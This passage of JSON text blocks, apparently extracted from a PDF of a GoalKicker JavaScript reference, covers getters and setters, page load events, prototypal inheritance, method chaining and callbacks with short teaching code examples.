        "text": "Accessing the  date. date  property would return the value  2017 - 02 - 27 . Setting  date. date   =   '2018-01-02  would call the setter function, which would then parse the string and set  date. year   =   '2018' ,  date. month   =   '01' , and date. day   =   '02' . Trying to pass an incorrectly formatted string (such as  \"hello\" ) would throw an error.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 25.3: De\ufb01ning getters and setters in ES6 class",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "class  Person  {   constructor ( firstname ,  lastname )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 204",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     this ._firstname  =  firstname ;      this ._lastname  =  lastname ;    }    get  firstname ()   {      return   this ._firstname ;    }    set  firstname ( name )   {      this ._firstname  =  name ;    }    get  lastname ()   {      return   this ._lastname ;    }    set  lastname ( name )   {      this ._lastname  =  name ;    } } let  person  =   new  Person ( 'John' ,   'Doe' ); console. log ( person. firstname ,  person. lastname );   // John Doe person. firstname   =   'Foo' ; person. lastname   =   'Bar' ; console. log ( person. firstname ,  person. lastname );   // Foo Bar",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 205",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 26: Events",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 26.1: Page, DOM and Browser loading",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This is an example to explain the variations of load events.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "onload event 1.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<body   onload = \"someFunction()\" > <img   src = \"image1\"   /> <img   src = \"image2\"   />",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</body> <script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    function someFunction() {     console.log(\"Hi! I am loaded\"); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this case, the message is logged once  all the contents of the page including the images and stylesheets(if any)  are",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "completely loaded.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "DOMContentLoaded event 2.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. addEventListener ( \"DOMContentLoaded\" ,   function ( event )   {     console. log ( \"Hello! I am loaded\" ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the above code, the message is logged only after the DOM/document is loaded ( ie:once the DOM is constructed ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Self-invoking anonymous function 3.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"Hi I am an anonymous function! I am loaded\" ); })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here, the message gets logged as soon as the browser interprets the anonymous function. It means, this function can get executed even before the DOM is loaded.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 206",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 27: Inheritance",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 27.1: Standard function prototype",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Start by de\ufb01ning a  Foo  function that we'll use as a constructor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Foo  (){}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "By editing  Foo. prototype , we can de\ufb01ne properties and methods that will be shared by all instances of  Foo .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Foo. prototype . bar   =   function ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   'I am bar' ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can then create an instance using the  new  keyword, and call the method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo  =   new  Foo (); console. log ( foo. bar ());   // logs `I am bar`",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 27.2: Di\ue023erence between Object.key and Object.prototype.key",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Unlike in languages like Python, static properties of the constructor function are  not  inherited to instances. Instances only inherit from their prototype, which inherits from the parent type's prototype. Static properties are never inherited.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Foo ()   {}; Foo. style   =   'bold' ; var  foo  =   new  Foo (); console. log ( Foo. style );   // 'bold' console. log ( foo. style );   // undefined Foo. prototype . style   =   'italic' ; console. log ( Foo. style );   // 'bold' console. log ( foo. style );   // 'italic'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 27.3: Prototypal inheritance",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Suppose we have a plain object called  prototype :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var   prototype   =   {  foo :   'foo' ,  bar :   function   ()   {   return   this . foo ;   }   };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now we want another object called  obj  that inherits from  prototype , which is the same as saying that  prototype  is the prototype of  obj",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =  Object. create ( prototype );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now all the properties and methods from  prototype  will be available to  obj",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( obj. foo );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 207",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( obj. bar ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"foo\" \"foo\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Prototypal inheritance is made through object references internally and objects are completely mutable. This means any change you make on a prototype will immediately a\ufb00ect every other object that prototype is prototype of.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "prototype . foo   =   \"bar\" ; console. log ( obj. foo );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"bar\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. prototype  is the prototype of every object, so it's strongly recommended you don't mess with it, especially if you use any third party library, but we can play with it a little bit.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. prototype . breakingLibraries   =   'foo' ; console. log ( obj. breakingLibraries ); console. log ( prototype . breakingLibraries );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"foo\" \"foo\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Fun fact  I've used the browser console to make these examples and broken this page by adding that",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "breakingLibraries  property.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 27.4: Pseudo-classical inheritance",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "It's an emulation of classical inheritance using prototypical inheritance which shows how powerful prototypes are. It was made to make the language more attractive to programmers coming from other languages.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version < 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "IMPORTANT NOTE : Since ES6 it doesn't make sense to use pseudo-classical inheritance since the language simulates conventional classes. If you're not using ES6,  you should . If you still want to use the classical inheritance pattern and you're in a ECMAScript 5 or lower environment, then pseudo-classical is your best bet. A \"class\" is just a function that is made to be called with the  new  operand and it's used as a constructor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Foo ( id ,  name )   {      this . id   =  id ;      this . name   =  name ; } var  foo  =   new  Foo ( 1 ,   'foo' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 208",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( foo. id );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output 1 foo is an instance of Foo. The JavaScript coding convention says if a function begins with a capital letter case it can be called as a constructor (with the  new  operand). To add properties or methods to the \"class\" you have to add them to its prototype, which can be found in the prototype  property of the constructor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Foo. prototype . bar   =   'bar' ; console. log ( foo. bar );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output bar In fact what Foo is doing as a \"constructor\" is just creating objects with  Foo. prototype  as it's prototype. You can \ufb01nd a reference to its constructor on every object",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( foo. constructor );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function Foo(id, name) { ...",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ({   } . constructor );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function Object() { [native code] } And also check if an object is an instance of a given class with the  instanceof  operator",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( foo  instanceof  Foo ); true console. log ( foo  instanceof  Object ); true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 27.5: Setting an Object's prototype",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "With ES5+, the  Object. create  function can be used to create an Object with any other Object as it's prototype.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 209",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  anyObj  =   {     hello ()   {         console. log ( ` this . foo  is $ { this . foo } ` );      }, }; let  objWithProto  =  Object. create ( anyObj ); objWithProto. foo   =   'bar' ; objWithProto. hello ();   // \"this.foo is bar\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To explicitly create an Object without a prototype, use  null  as the prototype. This means the Object will not inherit from  Object. prototype  either and is useful for Objects used for existence checking dictionaries, e.g.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  objInheritingObject  =   {}; let  objInheritingNull  =  Object. create ( null ); 'toString'   in  objInheritingObject ;   // true 'toString'   in  objInheritingNull  ;   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "From ES6, the prototype of an existing Object can be changed using  Object. setPrototypeOf , for example",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  obj  =  Object. create ({ foo :   'foo' }); obj  =  Object. setPrototypeOf ( obj ,   { bar :   'bar' });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. foo ;   // undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. bar ;   // \"bar\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This can be done almost anywhere, including on a  this  object or in a constructor. Note:  This process is very slow in current browsers and should be used sparingly, try to create the Object with the desired prototype instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version < 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Before ES5, the only way to create an Object with a manually de\ufb01ned prototype was to construct it with  new , for example",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  proto  =   { fizz :   'buzz' }; function  ConstructMyObj ()   {} ConstructMyObj. prototype   =  proto ; var  objWithProto  =   new  ConstructMyObj (); objWithProto. fizz ;   // \"buzz\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This behaviour is close enough to  Object. create  that it is possible to write a poly\ufb01ll.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 210",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 28: Method Chaining",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 28.1: Chainable object design and chaining",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Chaining and Chainable is a design methodology used to design object behaviors so that calls to object functions return references to self, or another object, providing access to additional function calls allowing the calling statement to chain together many calls without the need to reference the variable holding the object/s. Objects that can be chained are said to be chainable. If you call an object chainable, you should ensure that all returned objects / primitives are of the correct type. It only takes one time for your chainable object to not return the correct reference (easy to forget to add  return   this ) and the person using your API will lose trust and avoid chaining. Chainable objects should be all or nothing (not a chainable object even if parts are). An object should not be called chainable if only some of its functions are.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object designed to be chainable",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Vec ( x  =   0 ,  y  =   0 ){      this . x   =  x ;      this . y   =  y ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // the new keyword implicitly implies the return type      // as this and thus is chainable by default. }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Vec. prototype   =   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    add  :   function ( vec ){          this . x   +=  vec. x ;          this . y   +=  vec. y ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   this ;   // return reference to self to allow chaining of function calls",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     },     scale  :   function ( val ){          this . x   *=  val ;          this . y   *=  val ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   this ;   //  return reference to self to allow chaining of function calls",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     },     log  : function ( val ){         console. log ( this . x   +   ' : '   +   this . y );          return   this ;      },     clone  :   function (){          return   new  Vec ( this . x , this . y );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Chaining example",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  vec  =   new  Vec (); vec. add ({ x : 10 , y : 10 })     . add ({ x : 10 , y : 10 })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . log ()               // console output \"20 : 20\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . add ({ x : 10 , y : 10 })     . scale ( 1 / 30 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . log ()               // console output \"1 : 1\"     . clone ()             // returns a new instance of the object     . scale ( 2 )            // from which you can continue chaining",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . log ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Don't create ambiguity in the return type",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Not all function calls return a useful chainable type, nor do they always return a reference to self. This is where common sense use of naming is important. In the above example the function call  . clone ()  is unambiguous. Other",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 211",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "examples are  . toString ()  implies a string is returned. An example of an ambiguous function name in a chainable object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  // line object represents a line",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": " line. rotate ( 1 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . vec ();    // ambiguous you don't need to be looking up docs while writing.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": " line. rotate ( 1 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . asVec ()      // unambiguous implies the return type is the line as a vec (vector)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . add ({ x : 10 , y : 10 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  // toVec is just as good as long as the programmer can use the naming   // to infer the return type",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Syntax convention",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "There is no formal usage syntax when chaining. The convention is to either chain the calls on a single line if short or to chain on the new line indented one tab from the referenced object with the dot on the new line. Use of the semicolon is optional but does help by clearly denoting the end of the chain.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  vec. scale ( 2 ) . add ({ x : 2 , y : 2 }) . log ();    // for short chains",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  vec. scale ( 2 )       // or alternate syntax",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      . add ({ x : 2 , y : 2 })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      . log ();    // semicolon makes it clear the chain ends here    // and sometimes though not necessary",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  vec. scale ( 2 )            . add ({ x : 2 , y : 2 })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      . clone ()      // clone adds a new reference to the chain            . log ();   // indenting to signify the new reference    // for chains in chains",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  vec. scale ( 2 )            . add ({ x : 2 , y : 2 })       . add ( vec1. add ({ x : 2 , y : 2 })    // a chain as an argument            . add ({ x : 2 , y : 2 })        // is indented            . scale ( 2 ))       . log ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // or sometimes",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  vec. scale ( 2 )            . add ({ x : 2 , y : 2 })       . add ( vec1. add ({ x : 2 , y : 2 })    // a chain as an argument            . add ({ x : 2 , y : 2 })        // is indented            . scale ( 2 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       ) . log ();     // the argument list is closed on the new line",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A bad syntax",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   vec           // new line before the first function call       . scale ()    // can make it unclear what the intention is",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      . log ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   vec.           // the dot on the end of the line       scale ( 2 ) .   // is very difficult to see in a mass of code       scale ( 1 / 2 );   // and will likely frustrate as can easily be missed                    // when trying to locate bugs",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Left hand side of assignment",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 212",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When you assign the results of a chain the last returning call or object reference is assigned.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  var  vec2  =  vec. scale ( 2 )                 . add ( x : 1 , y : 10 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                . clone ();     // the last returned result is assigned                                  // vec2 is a clone of vec after the scale and add",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the above example  vec2  is assigned the value returned from the last call in the chain. In this case, that would be a copy of  vec  after the scale and add.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Summary",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The advantage of changing is clearer more maintainable code. Some people prefer it and will make chainable a requirement when selecting an API. There is also a performance bene\ufb01t as it allows you to avoid having to create variables to hold interim results. With the last word being that chainable objects can be used in a conventional way as well so you don't enforce chaining by making an object chainable.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 28.2: Method Chaining",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Method chaining is a programming strategy that simpli\ufb01es your code and beauti\ufb01es it. Method chaining is done by ensuring that each method on an object returns the entire object, instead of returning a single element of that object. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Door ()   {      this . height   =   '' ;      this . width   =   '' ;      this . status   =   'closed' ; } Door. prototype . open   =   function ()   {      this . status   =   'opened' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   this ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Door. prototype . close   =   function ()   {      this . status   =   'closed' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   this ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Door. prototype . setParams   =   function ( width , height )   {      this . width   =  width ;      this . height   =  height ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   this ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Door. prototype . doorStatus   =   function ()   {     console. log ( 'The' , this . width , 'x' , this . height , 'Door is' , this . status );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   this ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  smallDoor  =   new  Door (); smallDoor. setParams ( 20 , 100 ) . open () . doorStatus () . close () . doorStatus ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that each method in  Door. prototype  returns  this , which refers to the entire instance of that  Door  object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 213",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 29: Callbacks",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 29.1: Simple Callback Usage Examples",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Callbacks o\ufb00er a way to extend the functionality of a function (or method)  without changing  its code. This approach is often used in modules (libraries / plugins), the code of which is not supposed to be changed. Suppose we have written the following function, calculating the sum of a given array of values:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( array )   {      var  sum  =   0 ;      for   ( var  i  =   0 ;  i  <  array. length ;  i ++)   {         sum  +=  array [ i ];      }      return  sum ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now suppose that we want to do something with each value of the array, e.g. display it using  alert () . We could make the appropriate changes in the code of  foo , like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( array )   {      var  sum  =   0 ;      for   ( var  i  =   0 ;  i  <  array. length ;  i ++)   {         alert ( array [ i ]);         sum  +=  array [ i ];      }      return  sum ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But what if we decide to use  console. log  instead of  alert () ? Obviously changing the code of  foo , whenever we decide to do something else with each value, is not a good idea. It is much better to have the option to change our mind without changing the code of  foo . That's exactly the use case for callbacks. We only have to slightly change foo 's signature and body:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( array ,  callback )   {      var  sum  =   0 ;      for   ( var  i  =   0 ;  i  <  array. length ;  i ++)   {         callback ( array [ i ]);         sum  +=  array [ i ];      }      return  sum ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And now we are able to change the behaviour of  foo  just by changing its parameters:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   []; foo ( array ,  alert ); foo ( array ,   function   ( x )   {     console. log ( x ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Examples with Asynchronous Functions",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In jQuery, the  $. getJSON ()  method to fetch JSON data is asynchronous. Therefore, passing code in a callback makes sure that the code is called  after  the JSON is fetched.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 214",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "$. getJSON ()  syntax: $. getJSON (  url ,  dataObject ,  successCallback  );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example of  $. getJSON ()  code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "$. getJSON ( \"foo.json\" ,   {},   function ( data )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // data handling code });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The following would  not  work, because the data-handling code would likely be called  before  the data is actually received, because the  $. getJSON  function takes an unspeci\ufb01ed length of time and does not hold up the call stack as it waits for the JSON.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "$. getJSON ( \"foo.json\" ,   {});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// data handling code",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Another example of an asynchronous function is jQuery's  animate ()  function. Because it takes a speci\ufb01ed time to run the animation, sometimes it is desirable to run some code directly following the animation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". animate ()  syntax: jQueryElement. animate (  properties ,  duration ,  callback  );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For example, to create a fading-out animation after which the element completely disappears, the following code can be run. Note the use of the callback.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "elem. animate (   {  opacity :   0   },   5000 ,   function ()   {     elem. hide (); }   );",
        "font_name": "RobotoMono-Regular",
